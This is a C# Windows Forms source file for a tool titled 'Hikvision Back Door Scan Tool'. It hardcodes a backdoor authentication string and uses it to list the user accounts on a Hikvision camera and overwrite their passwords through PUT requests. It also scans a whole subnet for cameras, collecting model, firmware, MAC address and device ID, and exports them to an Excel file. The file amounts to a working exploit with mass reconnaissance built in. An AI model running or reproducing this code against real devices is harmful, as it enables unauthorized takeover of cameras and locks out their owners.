using NPOI.SS.UserModel;
using NPOI.XSSF.UserModel;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;
using System.Xml.Linq;

namespace HikBDCheckTool
{
	public partial class Main : Form
	{
		private const string BackdoorAuthArg = "auth=YWRtaW46MTEK";
		private Dictionary<string, string> userIds = new Dictionary<string, string>();
        private List<CamInfo> allCamInfo = new List<CamInfo>();
        private int scanStatus = 0;

        private Timer scanTick = new Timer();

		public Main()
		{
			InitializeComponent();
			this.Text = "Hikvision Back Door Scan Tool " + Assembly.GetExecutingAssembly().GetName().Version.ToString();
			txtIP.Focus();
            txtIP.LostFocus += TxtIP_LostFocus;
            scanTick.Interval = 1000;
            scanTick.Tick += ScanTick_Tick;

        }

        private void TxtIP_LostFocus(object sender, EventArgs e)
        {
            if (!ValidateIPAddress(txtIP.Text))
            {
                MessageBox.Show("IP Address is nov valid!","Warning!");
                txtIP.Focus();
            }

        }

        public  bool ValidateIPAddress(string ipAddress)
        {
            Regex validipregex = new Regex(@"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$");
            return (ipAddress != "" && validipregex.IsMatch(ipAddress.Trim())) ? true : false;
        }

        private void ScanTick_Tick(object sender, EventArgs e)
        {
            btnScanAllNet.Text = btnScanAllNet.Text=="Scanning Net..."? "Scanning Net": btnScanAllNet.Text == "Scanning Net.."? "Scanning Net...": "Scanning Net..";
        }

        private void btnGetUserList_Click(object sender, EventArgs e)
		{
            scanStatus = 0;
            userIds.Clear();
			lbUsers.Items.Clear();
			lblStatus.Text = "Loading user list...";
			lblStatus.ForeColor = Color.Orange;
			WebClient wc = new WebClient();
			wc.DownloadStringCompleted += (object client, DownloadStringCompletedEventArgs response) =>
			{
				if (response.Cancelled)
				{
					lblStatus.Text = "Canceled.";
					lblStatus.ForeColor = Color.Black;
					return;
				}
				if (response.Error != null)
				{
					lblStatus.Text = "An error occurred";
					lblStatus.ForeColor = Color.Red;
					MessageBox.Show(response.Error.Message);
					return;
				}
				XmlDocument doc = new XmlDocument();
				doc.LoadXml(response.Result);
				XmlNodeList Users = doc.GetElementsByTagName("User");
				foreach (XmlNode user in Users)
				{
					userIds[user["userName"].InnerText] = user["id"].InnerText;
					lbUsers.Items.Add(user["userName"].InnerText);
				}
				if (lbUsers.Items.Count > 0)
				{
					lbUsers.SelectedIndex = 0;
					txtNewPW.Focus();
				}
				lblStatus.Text = "Loaded " + lbUsers.Items.Count + " user" + (lbUsers.Items.Count == 1 ? "" : "s") + ".  Ready to set passwords.";
				lblStatus.ForeColor = Color.Green;
                btnSetPassword.Enabled = true;
			};
			wc.DownloadStringAsync(new Uri(GetURLBase() + "Security/users?" + BackdoorAuthArg));
		}

		private void btnSetPassword_Click(object sender, EventArgs e)
		{
			if (lbUsers.SelectedItem == null)
			{
				lblStatus.Text = "No user is selected";
				lblStatus.ForeColor = Color.Red;
				return;
			}
			if (string.IsNullOrWhiteSpace(txtNewPW.Text))
			{
				lblStatus.Text = "Enter a password";
				lblStatus.ForeColor = Color.Red;
				return;
			}
			string userName = lbUsers.SelectedItem.ToString();
			string userId = userIds[userName];
			if (string.IsNullOrWhiteSpace(userId))
			{
				lblStatus.Text = "Could not find user ID for user with name \"" + userName + "\"";
				lblStatus.ForeColor = Color.Red;
				return;
			}
			lblStatus.Text = "Assigning password \"" + txtNewPW.Text + "\" to user \"" + userName + "\"";
			lblStatus.ForeColor = Color.Orange;
			WebClient wc = new WebClient();
			wc.UploadStringCompleted += (object client, UploadStringCompletedEventArgs response) =>
			{
				if (response.Cancelled)
				{
					lblStatus.Text = "Canceled.";
					lblStatus.ForeColor = Color.Black;
					return;
				}
				if (response.Error != null)
				{
					lblStatus.Text = "An error occurred";
					lblStatus.ForeColor = Color.Red;
					MessageBox.Show(response.Error.Message);
					return;
				}
				if (response.Result.Contains("<statusString>OK</statusString>"))
				{
					lblStatus.Text = "Successfully assigned password \"" + txtNewPW.Text + "\" to user \"" + userName + "\"";
					lblStatus.ForeColor = Color.Green;
				}
				else
				{
					lblStatus.Text = "An error occurred";
					lblStatus.ForeColor = Color.Red;
					MessageBox.Show(response.Result);
				}
			};
			string userXml =
@"<User version=""1.0"" xmlns=""http://www.hikvision.com/ver10/XMLSchema"">
	<id>" + userId + @"</id>
	<userName>" + userName + @"</userName>
	<password>" + txtNewPW.Text + @"</password>
</User>";
			wc.UploadStringAsync(new Uri(GetURLBase() + "Security/users/" + userId + "?" + BackdoorAuthArg), "PUT", userXml);
		}


		private void lbUsers_SelectedValueChanged(object sender, EventArgs e)
		{
            if (scanStatus == 2)
            { txtIP.Text = lbUsers.SelectedItem == null ? "" : lbUsers.SelectedItem.ToString(); }
            else
            {
                lblSelectedUser.Text = lbUsers.SelectedItem == null ? "" : lbUsers.SelectedItem.ToString();
            }
		}

        private string GetURLBase(string ip = "")
        {
            return "http" + (cbHttps.Checked ? "s" : "") + "://" + (string.IsNullOrEmpty(ip) ? txtIP.Text : ip) + ":" + (int)nudPort.Value + "/";
        }

        /// <summary>
        /// Scan the specific net segment
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void BtnScanAllNet_Click(object sender, EventArgs e)
        {
            if (scanStatus != 0)
            {
                MessageBox.Show(scanStatus==1?"Scanning ...Please wait it finished!":"Click Clear button if start a new scan!");
                return;
            }
            scanTick.Enabled = true;
            btnGetUserList.Enabled = false;
            scanTick.Start();
            lbUsers.Items.Clear();
            scanStatus = 1;
            lblStatus.Text = "Scanning net Segment...";
            lblStatus.ForeColor = Color.Orange;
            btnSetPassword.Enabled = false;
            btnScanAllNet.Text = "Scanning Net...";
            WebClientExt wc = new WebClientExt(int.Parse(txbOutTime.Text));
            wc.DownloadStringCompleted += DownloadStringCompleted; 

            string[] AllIP = txtIP.Text.Split('.');

            for (int i = 0; i < 255; i++)
            {
                if (scanStatus != 1)
                    return;
                AllIP[3] = i.ToString();
                string url = string.Join(".",AllIP);

                if (wc.IsBusy)
                {
                    lblStatus.Text = "Scanning " + url + "...";
                    WebClientExt wc1 = new WebClientExt(int.Parse(txbOutTime.Text));
                    wc1.DownloadStringCompleted += DownloadStringCompleted;
                    wc1.DownloadStringAsync(new Uri(GetURLBase(url) + "System/deviceInfo?" + BackdoorAuthArg));
                    continue;
                }

                wc.DownloadStringAsync(new Uri(GetURLBase(url) + "System/deviceInfo?" + BackdoorAuthArg));
            }
            
            //May be add userlist with this 
            //wc.


        }


        public void DownloadStringCompleted(object client, DownloadStringCompletedEventArgs response)
        {
            if (response.Cancelled)
            {
                lblStatus.Text = "Canceled.";
                lblStatus.ForeColor = Color.Black;
                return;
            }
            WebClientExt wcc = (WebClientExt)client;
            string ip = wcc.BaseUrl.Split('/')[2];
            if (ip.Split('.')[3] == "254")
            {
                scanStatus = 2;
                lblStatus.Text = "Scan Net Segment Finished,Find " + lbUsers.Items.Count + " Cam.";
                btnScanAllNet.Text = "Scan Finished";
                lblStatus.ForeColor = Color.Green;

                scanTick.Enabled = false;
                scanTick.Stop();
                btnExportXLS.Enabled = true;
                btnGetUserList.Enabled = true;
            }
            if (response.Error != null)
            {
                //lblStatus.Text = "An error occurred";
                //lblStatus.ForeColor = Color.Red;
                Console.WriteLine(((WebClientExt)client).BaseUrl + response.Error.Message);
               
                return;
            }
           
            XmlDocument doc = new XmlDocument();
            doc.LoadXml(response.Result);
            XmlNodeList DeviceInfos = doc.GetElementsByTagName("DeviceInfo");
            XmlNode Devinfo = DeviceInfos[0];

            CamInfo temp = new CamInfo
            {
                DeviceID = Devinfo["deviceID"].InnerText,
                FirewVersion = Devinfo["firmwareVersion"].InnerText,
                MacAddress = Devinfo["macAddress"].InnerText,
                Model = Devinfo["model"].InnerText
            };

            //TODO:
            //temp.UserList =

            //CamIp
           
            temp.Ipaddress = ip;


            allCamInfo.Add(temp);

            lbUsers.Items.Add(temp.Ipaddress);
            lblStatus.Text = "Loaded " + temp.Ipaddress + " Cam info";
            lblStatus.ForeColor = Color.Green;
        }

        private void btnClaer_Click(object sender, EventArgs e)
        {
            scanStatus = 0;
            lbUsers.Items.Clear();
            allCamInfo.Clear();
            btnSetPassword.Enabled = false;
            btnGetUserList.Enabled = true;
            btnScanAllNet.Text = "Scan Net";
            lblStatus.Text = "All Clear";
        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            if(scanStatus==1)
            {
                MessageBox.Show("Scan is not Finish!","Warning");
                e.Cancel = true;
            }
        }

        private void btnExportXLS_Click(object sender, EventArgs e)
        {
            if (allCamInfo.Count==0)
            {
                MessageBox.Show("No Cam Find! Export fail");
                return;
            }
            var newFile = @"export.xlsx";
            using (var fs = new FileStream(newFile, FileMode.Create, FileAccess.Write))
            {
                IWorkbook workbook = new XSSFWorkbook();
                ISheet sheet1 = workbook.CreateSheet("Sheet1");
                int rowIndex = 0;

                IRow row = sheet1.CreateRow(rowIndex);

                ICell cell_head = row.CreateCell(0);
                cell_head.SetCellValue("编号");

                ICell cell_1 = row.CreateCell(1);
                cell_1.SetCellValue("IP地址");

                ICell cell_2 = row.CreateCell(2);
                cell_2.SetCellValue("型号");

                ICell cell_3 = row.CreateCell(3);
                cell_3.SetCellValue("固件版本");

                ICell cell_4 = row.CreateCell(4);
                cell_4.SetCellValue("MAC地址");

                ICell cell_5 = row.CreateCell(5);
                cell_5.SetCellValue("设备ID");

                rowIndex += 1;
                allCamInfo.Sort();
                foreach (CamInfo cam in allCamInfo)
                {
                    IRow row1 = sheet1.CreateRow(rowIndex);
                    //int calIndex = 0;
                    ICell cell = row1.CreateCell(0);
                    cell.SetCellValue(rowIndex);

                    //calIndex++;
                    ICell cell1 = row1.CreateCell(1);
                    //string Ipaddress =string.Copy( cam.Ipaddress;
                    cell1.SetCellValue(string.Copy(cam.Ipaddress));

                    //calIndex++;
                    ICell cell3 = row1.CreateCell(2);
                    cell3.SetCellValue(cam.Model);

                    //calIndex++;
                    ICell cell4 = row1.CreateCell(3);
                    cell4.SetCellValue(cam.FirewVersion);

                    //calIndex++;
                    ICell cell5 = row1.CreateCell(4);
                    cell5.SetCellValue(cam.MacAddress);

                    //calIndex++;
                    ICell cell6 = row1.CreateCell(5);
                    cell6.SetCellValue(cam.DeviceID);

                    rowIndex += 1;
                }
                    workbook.Write(fs);
            }
            Console.WriteLine("Export Excel  Done");

        }
    }

    public class WebClientExt : WebClient
    {
        private int Timeout;
        public string BaseUrl;
        public WebClientExt(int timeOut)
        {
            Timeout = timeOut;
        }

        protected override WebRequest GetWebRequest(Uri address)
        {
            BaseUrl = address.ToString();
            HttpWebRequest request = (HttpWebRequest)base.GetWebRequest(address);
            request.Timeout = 1000 * Timeout;
            request.ReadWriteTimeout = 1000 * Timeout;
            return request;
        }
    }
}
